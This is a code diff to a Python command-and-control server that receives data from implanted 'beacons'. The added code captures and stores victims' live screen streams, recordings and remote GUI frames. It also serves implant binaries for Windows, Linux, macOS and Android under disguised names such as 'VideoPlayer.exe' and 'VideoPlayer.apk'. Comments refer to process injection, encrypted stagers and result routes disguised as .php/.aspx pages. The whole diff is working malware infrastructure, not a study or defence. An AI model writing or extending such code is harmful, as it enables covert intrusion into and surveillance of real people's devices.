@@ -49,12 +49,17 @@ class C2State:
     """Thread-safe state shared by the C2 shell and aiohttp listener."""
 
     def __init__(self):
-        self.lock = threading.Lock()
+        # RLock: result decoding calls _append_live_segment / artifact
+        # savers that re-acquire the lock for their own bookkeeping.
+        self.lock = threading.RLock()
         self.beacons: dict[str, dict[str, Any]] = {}
         self.tasks: dict[str, list[dict[str, Any]]] = {}
         self.results: dict[str, list[dict[str, Any]]] = {}
         self.auth_counters: dict[str, int] = {}
         self.auth_nonces: dict[str, set[str]] = {}
+        # progressive screen-stream segments per beacon (TRUE live): appended
+        # as they arrive, served to the UI for real-time viewing.
+        self.live_segments: dict[str, list[dict[str, Any]]] = {}
 
     def authenticate_beacon(self, request: web.Request, body: str) -> bool:
         """Validate a registered beacon's HMAC and reject replayed requests.
@@ -245,6 +250,13 @@ class C2State:
                                                output[len("SCREENSHOT_B64:"):])
                 artifact_note = f"[Screenshot captured — saved to {p}]" if p \
                                 else "[Screenshot decode failed]"
+            elif output.startswith("REMOTE_FRAME_B64:"):
+                # Remote-session module: a live GUI frame (JPEG/PNG). Land in
+                # data/remote/ so the operator can watch the stream.
+                p = self._save_binary_artifact(beacon_id, "remote", "",
+                                               output[len("REMOTE_FRAME_B64:"):])
+                artifact_note = f"[Remote frame captured — saved to {p}]" if p \
+                                else "[Remote frame decode failed]"
             elif output.startswith("CAM_FRAME:"):
                 raw = output[len("CAM_FRAME:"):]
                 device, _, b64 = raw.partition("|")
@@ -260,6 +272,27 @@ class C2State:
                                                output[len("MEDIA_B64:"):])
                 artifact_note = f"[Media artifact saved to {p}]" if p \
                                 else "[Media decode failed]"
+            elif output.startswith("SCREENREC_B64:"):
+                # passive screen recording (PHREC container of JPEG frames)
+                p = self._save_recording_frames(
+                    beacon_id, output[len("SCREENREC_B64:"):])
+                artifact_note = f"[Screen recording saved — {p}]" if p \
+                                else "[Screen recording decode failed]"
+            elif output.startswith("SCREEN_LIVE_SEG:"):
+                # progressive live segment: appended to the live buffer as it
+                # arrives so the UI can watch the screen WHILE recording.
+                n = self._append_live_segment(
+                    beacon_id, output[len("SCREEN_LIVE_SEG:"):])
+                artifact_note = (f"[Live stream segment {n} — recording in "
+                                 "progress]" if n else
+                                 "[Live segment decode failed]")
+            elif output.startswith("SCREEN_DUMP:"):
+                p = self._save_binary_artifact(
+                    beacon_id, "recordings", "mp4",
+                    output[len("SCREEN_DUMP:"):],
+                    forced_name=f"screenrec_{datetime.now().strftime('%H%M%S')}.mp4")
+                artifact_note = f"[Screen recording dump — saved to {p}]" if p \
+                                else "[Screen dump decode failed]"
             elif output.startswith("FILE_B64:"):
                 # beacon sends "FILE_B64:<b64>" — derive the name from the
                 # task the operator queued (download <path>).
@@ -307,6 +340,8 @@ class C2State:
             return ".bmp"
         if raw[:4] == b"GIF8":
             return ".gif"
+        if raw[4:8] in (b"ftyp", b"moov") or raw[:3] == b"\x00\x00\x00":
+            return ".mp4"
         return ""
 
     def _save_binary_artifact(self, beacon_id: str, subdir: str, ext: str,
@@ -342,6 +377,142 @@ class C2State:
         except Exception as exc:
             logger.warning("artifact save failed: %s", exc)
             return ""
+
+    # ── Screen recording helpers ────────────────────────────────────────────
+
+    @staticmethod
+    def _recordings_root() -> str:
+        from phantom.utils.paths import data_dir
+        return os.path.join(data_dir(), "recordings")
+
+    def _save_recording_frames(self, beacon_id: str, b64_data: str) -> str:
+        """Decode a passive PHREC recording ("PHREC" + u32 count + per frame
+        u32 ts_ms + u32 len + JPEG). Frames are written flat as
+        <beacon>_<ts>_frame_NNN.jpg under data/recordings/ so they are
+        viewable even without ffmpeg; if ffmpeg exists the frames are ALSO
+        muxed into <beacon>_<ts>.mp4. Returns a human path, or ""."""
+        import base64 as _b64
+        import shutil as _sh
+        try:
+            raw = _b64.b64decode(b64_data, validate=False)
+        except Exception:
+            return ""
+        if raw[:5] != b"PHREC" or len(raw) < 9:
+            return ""
+        try:
+            count = int.from_bytes(raw[5:9], "little")
+        except Exception:
+            return ""
+        if count <= 0 or count > 6000:
+            return ""
+        root = self._recordings_root()
+        safe = "".join(c for c in beacon_id if c.isalnum())[:16] or "beacon"
+        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+        try:
+            os.makedirs(root, exist_ok=True)
+        except OSError:
+            return ""
+        off = 9
+        written = 0
+        jpgs: list[str] = []
+        for i in range(count):
+            if off + 8 > len(raw):
+                break
+            jlen = int.from_bytes(raw[off + 4:off + 8], "little")
+            off += 8
+            if jlen <= 0 or off + jlen > len(raw):
+                break
+            jpg = raw[off:off + jlen]
+            off += jlen
+            if jpg[:3] != b"\xff\xd8\xff":
+                continue
+            name = f"{safe}_{ts}_frame_{i:04d}.jpg"
+            try:
+                with open(os.path.join(root, name), "wb") as fh:
+                    fh.write(jpg)
+                jpgs.append(name)
+                written += 1
+            except OSError:
+                break
+        if written == 0:
+            return ""
+        # best-effort mux into an actual .mp4 for the video player
+        mp4 = os.path.join(root, f"{safe}_{ts}.mp4")
+        ffmpeg = _sh.which("ffmpeg") or _sh.which("ffmpeg.exe")
+        if ffmpeg:
+            try:
+                import subprocess as _sp
+                pattern = os.path.join(root, f"{safe}_{ts}_frame_%04d.jpg")
+                _sp.run([ffmpeg, "-y", "-framerate", "2", "-i", pattern,
+                         "-c:v", "libx264", "-pix_fmt", "yuv420p", "-an",
+                         mp4], capture_output=True, timeout=60)
+            except Exception:
+                pass
+        if os.path.exists(mp4):
+            return mp4
+        return f"{written} frames ({safe}_{ts})"
+
+    def _append_live_segment(self, beacon_id: str, b64_data: str) -> int:
+        """Append one progressive live segment to the beacon's live buffer
+        (and a copy on disk under data/recordings/live/). Returns the segment
+        index, or 0 on failure."""
+        import base64 as _b64
+        try:
+            raw = _b64.b64decode(b64_data, validate=False)
+        except Exception:
+            return 0
+        if not raw:
+            return 0
+        with self.lock:
+            buf = self.live_segments.setdefault(beacon_id, [])
+            n = len(buf) + 1
+            buf.append({"seq": n, "size": len(raw),
+                        "time": datetime.now().isoformat(timespec="seconds")})
+            if len(buf) > 500:
+                del buf[:-500]
+        # persist a copy (best-effort) for later concat/playback
+        try:
+            root = os.path.join(self._recordings_root(), "live")
+            os.makedirs(root, exist_ok=True)
+            safe = "".join(c for c in beacon_id if c.isalnum())[:16] or "beacon"
+            with open(os.path.join(root, f"{safe}_seg_{n:04d}.bin"), "wb") as fh:
+                fh.write(raw)
+        except OSError:
+            pass
+        self._concat_live_mp4(beacon_id)
+        return n
+
+    def _concat_live_mp4(self, beacon_id: str) -> str:
+        """Best-effort: mux buffered live segments into a single playable
+        .mp4 (data/recordings/live/<beacon>_live.mp4) with ffmpeg whenever a
+        new segment arrives, so the UI can play the growing recording."""
+        import shutil as _sh
+        ffmpeg = _sh.which("ffmpeg") or _sh.which("ffmpeg.exe")
+        if not ffmpeg:
+            return ""
+        root = os.path.join(self._recordings_root(), "live")
+        safe = "".join(c for c in beacon_id if c.isalnum())[:16] or "beacon"
+        segs = sorted(f for f in os.listdir(root)
+                      if f.startswith(f"{safe}_seg_") and f.endswith(".bin"))
+        if len(segs) < 2:
+            return ""
+        try:
+            import subprocess as _sp
+            lst = os.path.join(root, f"{safe}_list.txt")
+            with open(lst, "w", encoding="utf-8") as fh:
+                for s in segs:
+                    fh.write(f"file '{os.path.join(root, s)}'\n")
+            out = os.path.join(root, f"{safe}_live.mp4")
+            _sp.run([ffmpeg, "-y", "-f", "concat", "-safe", "0",
+                     "-i", lst, "-c", "copy", out],
+                    capture_output=True, timeout=60)
+            return out if os.path.exists(out) else ""
+        except Exception:
+            return ""
+
+    def get_live_segments(self, beacon_id: str) -> list[dict[str, Any]]:
+        with self.lock:
+            return list(self.live_segments.get(beacon_id, []))
 
     def get_beacons(self) -> dict[str, dict[str, Any]]:
         with self.lock:
@@ -534,6 +705,30 @@ async def handle_result(request: web.Request, pre_body: Optional[str] = None) ->
         return web.Response(status=500)
 
 
+# Filename a browser saves the artifact under. Without a
+# Content-Disposition header the browser names the file after the LAST URL
+# SEGMENT — `payload_android`, no extension — and a file with no extension
+# cannot be run on Windows nor installed on Android. The extension must
+# match the real format: PE -> .exe, APK -> .apk, ELF -> none (chmod+run).
+_PAYLOAD_DOWNLOADS = {
+    "/api/v1/payload": "VideoPlayer.exe",
+    "/api/v1/payload_pic": "beacon.bin",
+    "/api/v1/payload_linux": "video-player-linux",
+    "/api/v1/payload_linux_x86": "video-player-linux-x86",
+    "/api/v1/payload_macos": "video-player-macos",
+    "/api/v1/payload_android": "VideoPlayer.apk",
+    "/api/v1/remote_payload_windows": "remote.exe",
+    "/api/v1/remote_payload_linux": "remote-linux",
+    "/api/v1/remote_payload_macos": "remote-macos",
+    "/api/v1/remote_payload_android": "remote.apk",
+}
+
+
+def payload_download_name(path: str) -> str:
+    """Runnable filename for a payload route (used in Content-Disposition)."""
+    return _PAYLOAD_DOWNLOADS.get(path, "payload.bin")
+
+
 async def handle_payload(request: web.Request) -> web.Response:
     """GET /api/v1/payload[_<platform>] — Serves the compiled beacon binary.
        Requires ?auth=TOKEN or X-Auth-Token header."""
@@ -555,10 +750,20 @@ async def handle_payload(request: web.Request) -> web.Response:
             "/api/v1/payload_linux_x86": "beacon_linux_x86",
             "/api/v1/payload_macos": "beacon_macos",
             "/api/v1/payload_android": "beacon_android",
+            "/api/v1/remote_payload_windows": "remote.exe",
+            "/api/v1/remote_payload_linux": "remote_linux",
+            "/api/v1/remote_payload_macos": "remote_macos",
+            "/api/v1/remote_payload_android": "remote.apk",
         }
         filename = platform_map.get(request.path)
         if not filename:
             return web.Response(text="Invalid payload path", status=404)
+
+        # Remote-session module lives in payloads/remote/, beacon in payloads/beacon/
+        if request.path.startswith("/api/v1/remote_payload"):
+            payload_path = os.path.join(os.path.dirname(__file__), "..", "payloads", "remote", filename)
+        else:
+            payload_path = os.path.join(os.path.dirname(__file__), "..", "payloads", "beacon", filename)
 
         # beacon.bin is the position-independent loader+PE blob: it is the
         # artifact the migrate command injects into a sacrificial process
@@ -569,21 +774,27 @@ async def handle_payload(request: web.Request) -> web.Response:
         # on most real targets (Debian bookworm/Ubuntu 22.04 ship 2.34-2.36).
         # The static build runs on any glibc/musl. This is the same binary
         # the auto-mode SSH deploy path already uses on purpose.
-        if filename == "beacon_linux":
+        is_remote = request.path.startswith("/api/v1/remote_payload")
+        if not is_remote and filename == "beacon_linux":
             static_path = os.path.join(
                 os.path.dirname(__file__), "..", "payloads", "beacon",
                 "beacon_linux_static")
             if os.path.exists(static_path):
                 filename = "beacon_linux_static"
 
-        payload_path = os.path.join(os.path.dirname(__file__), "..", "payloads", "beacon", filename)
         if not os.path.exists(payload_path):
             return web.Response(text=f"Payload '{filename}' not compiled yet.", status=404)
         
         with open(payload_path, "rb") as f:
             data = f.read()
-        
-        return web.Response(body=data, content_type="application/octet-stream")
+
+        # the name the browser saves has to stay RUNNABLE: a PE saved with no
+        # extension (or as .mp4) is simply not executable
+        download = payload_download_name(request.path)
+        return web.Response(
+            body=data, content_type="application/octet-stream",
+            headers={"Content-Disposition":
+                     f'attachment; filename="{download}"'})
     except Exception as e:
         logger.error(f"Payload delivery error: {e}")
         return web.Response(status=500)
@@ -825,19 +1036,22 @@ class C2Server:
         # REST API (Telegram bot / external tools)
         app.router.add_get("/api/v1/beacons", handle_beacons)
         app.router.add_post("/api/v1/queue", handle_queue_task)
-        app.router.add_get("/api/v1/results", handle_results_api)
-
-        # Results
+        app.router.add_get("/api/v1/results", handle_results_api)        # Results
         app.router.add_post("/api/v1/result", handle_result)
         app.router.add_post(r"/{path:.*\.php}", handle_result)
         app.router.add_post(r"/{path:.*\.aspx}", handle_result)
-        
+
         # Payload delivery
         app.router.add_get("/api/v1/payload", handle_payload)
         app.router.add_get("/api/v1/payload_linux", handle_payload)
         app.router.add_get("/api/v1/payload_linux_x86", handle_payload)
         app.router.add_get("/api/v1/payload_macos", handle_payload)
         app.router.add_get("/api/v1/payload_android", handle_payload)
+        # Remote-session module binaries (standalone GUI takeover companion)
+        app.router.add_get("/api/v1/remote_payload_windows", handle_payload)
+        app.router.add_get("/api/v1/remote_payload_linux", handle_payload)
+        app.router.add_get("/api/v1/remote_payload_macos", handle_payload)
+        app.router.add_get("/api/v1/remote_payload_android", handle_payload)
         # One-liner platform stagers
         app.router.add_get("/s/android", handle_android_stager)
         # Ultra-compact PIC stager endpoint (XOR-encrypted beacon.bin)
